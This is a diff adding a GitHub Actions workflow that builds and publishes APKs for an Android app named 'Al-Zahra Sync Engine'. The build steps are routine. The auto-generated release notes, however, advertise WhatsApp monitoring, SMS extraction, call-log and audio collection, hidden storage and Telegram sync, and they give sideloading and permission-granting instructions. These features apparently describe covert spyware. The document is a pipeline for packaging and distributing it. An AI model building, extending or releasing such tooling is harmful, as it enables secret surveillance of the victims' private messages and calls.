@@ -1,0 +1,95 @@
+name: Build Al-Zahra APK
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Set up JDK 17
+      uses: actions/setup-java@v4  
+      with:
+        java-version: '17'
+        distribution: 'temurin'
+        
+    - name: Setup Android SDK
+      uses: android-actions/setup-android@v3
+      
+    - name: Cache Gradle dependencies
+      uses: actions/cache@v4
+      with:
+        path: |
+          ~/.gradle/caches
+          ~/.gradle/wrapper
+        key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+        restore-keys: |
+          ${{ runner.os }}-gradle-
+          
+    - name: Setup Gradle
+      uses: gradle/actions/setup-gradle@v3
+      with:
+        gradle-version: '8.0'
+        
+    - name: Create local.properties
+      run: |
+        echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
+        
+    - name: Build Debug APK
+      run: gradle assembleDebug --no-daemon --stacktrace
+      
+    - name: Build Release APK
+      run: gradle assembleRelease --no-daemon --stacktrace
+      
+    - name: List output files
+      run: find app/build/outputs -name "*.apk" -type f
+      
+    - name: Upload Debug APK
+      uses: actions/upload-artifact@v4
+      with:
+        name: AlZahra-Debug
+        path: app/build/outputs/apk/debug/*.apk
+        if-no-files-found: warn
+        
+    - name: Upload Release APK
+      uses: actions/upload-artifact@v4
+      with:
+        name: AlZahra-Release
+        path: app/build/outputs/apk/release/*.apk
+        if-no-files-found: warn
+        
+    - name: Create GitHub Release
+      uses: softprops/action-gh-release@v1
+      if: github.ref == 'refs/heads/main'
+      with:
+        files: |
+          app/build/outputs/apk/debug/*.apk
+          app/build/outputs/apk/release/*.apk
+        tag_name: v2.0.${{ github.run_number }}
+        name: Al-Zahra v2.0 Build ${{ github.run_number }}
+        body: |
+          ## ✅ Al-Zahra Sync Engine v2.0
+          
+          ### Features:
+          - 📱 Real-time data collection
+          - 💬 WhatsApp monitoring
+          - 📩 SMS extraction  
+          - 📞 Call logs
+          - 🔊 Audio files
+          - 🔒 Hidden storage
+          - 📤 Telegram sync
+          
+          ### Installation:
+          1. Download APK
+          2. Enable "Unknown Sources"
+          3. Install & grant permissions
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
